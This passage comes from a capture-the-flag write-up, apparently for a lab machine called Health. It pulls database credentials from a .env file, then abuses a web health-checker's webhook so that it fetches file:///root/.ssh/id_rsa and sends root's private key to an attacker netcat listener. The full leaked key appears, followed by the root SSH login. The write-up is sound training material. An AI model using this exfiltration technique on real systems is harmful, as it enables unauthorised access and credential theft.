<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Active Ports
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    
tcp6     113      0 :::80                   :::*                    LISTEN      -                    
tcp6       0      0 :::22                   :::*                    LISTEN      -                    
tcp6       0      0 :::3000                 :::*                    LISTEN      -  
</pre></td></tr></tbody></table></code></pre></div></div>
<p>One of the port that is running is <code class="language-plaintext highlighter-rouge">3306</code> which is <code class="language-plaintext highlighter-rouge">mysql</code> database, also <code class="language-plaintext highlighter-rouge">linpeas.sh</code> shows the database name and password in <code class="language-plaintext highlighter-rouge">.env</code> inside <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Then i entered the credentials to access the database. Password will be <code class="language-plaintext highlighter-rouge">MYsql_strongestpass@2014+</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>susanne@health:/var/www/html$ mysql -u laravel -p 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>After access the database i navigated along it and i found the <code class="language-plaintext highlighter-rouge">tasks</code> table but it was empty so do almost all other tables, this can be caused by some of the cleaning process then i uploaded the <code class="language-plaintext highlighter-rouge">pspy64</code> to see all running processes.</p>

<p>There is <code class="language-plaintext highlighter-rouge">php artisan schedule:run</code> i don know what exactly it‚Äôs doing but i know user <code class="language-plaintext highlighter-rouge">root</code> is running this process and also there is a cleaning script <code class="language-plaintext highlighter-rouge">clean.sh</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>2022/10/07 11:47:01 CMD: UID=0    PID=58698  | php artisan schedule:run 
2022/10/07 11:47:01 CMD: UID=0    PID=58697  | /bin/bash -c cd /var/www/html &amp;&amp; php artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 
2022/10/07 11:47:01 CMD: UID=0    PID=58696  | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh 
2022/10/07 11:47:01 CMD: UID=0    PID=58695  | /usr/sbin/CRON -f 
2022/10/07 11:47:01 CMD: UID=0    PID=58694  | /usr/sbin/CRON -f 
2022/10/07 11:47:01 CMD: UID=0    PID=58699  | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh 
2022/10/07 11:47:02 CMD: UID=0    PID=58700  | php artisan schedule:run 
2022/10/07 11:47:07 CMD: UID=0    PID=58706  | mysql laravel --execute TRUNCATE tasks 
2022/10/07 11:48:01 CMD: UID=0    PID=58711  | /bin/bash -c sleep 5 &amp;&amp; /root/meta/clean.sh 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/health/10.png" alt="image" />
This lines show that the <code class="language-plaintext highlighter-rouge">shedule</code> is controlled here and it hash access to the database, also the task is used to perform <code class="language-plaintext highlighter-rouge">HealthChecker</code> on a web browser.</p>

<p>Then i will access the database again and check what will happen after submitting the monitored url.  About my IP address i changed the <code class="language-plaintext highlighter-rouge">vpn</code>. Here are the steps for this attack.</p>
<ol>
  <li>Create a webhook as shown above
<img src="/assets/img/health/11.png" alt="image" />
After creating a webhook then the task table will be triggered.</li>
  <li>Start a <code class="language-plaintext highlighter-rouge">netcat</code> listener</li>
  <li>Check for the database in task to see if a webhook is successful registered
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>mysql&gt; mysql&gt; select * from tasks;
+--------------------------------------+-------------------------+-----------+--------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl              | onlyError | monitoredUrl       | frequency | created_at          | updated_at          |
+--------------------------------------+-------------------------+-----------+--------------------+-----------+---------------------+---------------------+
| 92ff83fd-df17-4563-848f-282859d519cf | http://10.10.14.21:1234 |         0 | http://10.10.14.21 | * * * * * | 2023-01-11 13:51:12 | 2023-01-11 13:51:12 |
+--------------------------------------+-------------------------+-----------+--------------------+-----------+---------------------+---------------------+
1 row in set (0.00 sec)
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
</ol>

<p>In tasks there is new created webhook then i will update the <code class="language-plaintext highlighter-rouge">monitoredUrl</code> and extract some files by using <code class="language-plaintext highlighter-rouge">update</code> command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>mysql&gt; update tasks set monitoredUrl = 'file:///root/.ssh/id_rsa';
Query OK, 1 row affected (0.01 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql&gt; select * from tasks;                                                                                                                                                                    
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+                              
| id                                   | webhookUrl              | onlyError | monitoredUrl             | frequency | created_at          | updated_at          |                              
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+                              
| 5b027a6f-8a6c-402b-9a45-96da013488ef | http://10.10.14.21:1234 |         0 | file:///root/.ssh/id_rsa | * * * * * | 2023-01-11 14:01:25 | 2023-01-11 14:01:25 |                              
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+                              
1 row in set (0.00 sec) 
</pre></td></tr></tbody></table></code></pre></div></div>

<ol>
  <li>In <code class="language-plaintext highlighter-rouge">netcat</code> listener you have a hit with this file <code class="language-plaintext highlighter-rouge">id_rsa</code></li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.176] 56288
POST / HTTP/1.1
Host: 10.10.14.21:1234
Accept: */*
Content-type: application/json
Content-Length: 1832
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.14.21:1234","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Save the file as you wish and then use the following to have a clear <code class="language-plaintext highlighter-rouge">id_rsa</code> file format</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ cat id_rsa| jq .body -r
‚îî‚îÄ$ cat id_rsa| jq .body -r &gt; id_rsaa
‚îî‚îÄ$ chmod 600 id_rsaa  
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Login a root user</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ ssh -i id_rsaa root@10.10.11.176 
</pre></td></tr></tbody></table></code></pre></div></div>

<p><strong>Root flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@health:~# cat /root/root.txt 
0123a54aa1778d*********
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The End.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Mungu Nisaidie
</pre></td></tr></tbody></table></code></pre></div></div>
:ET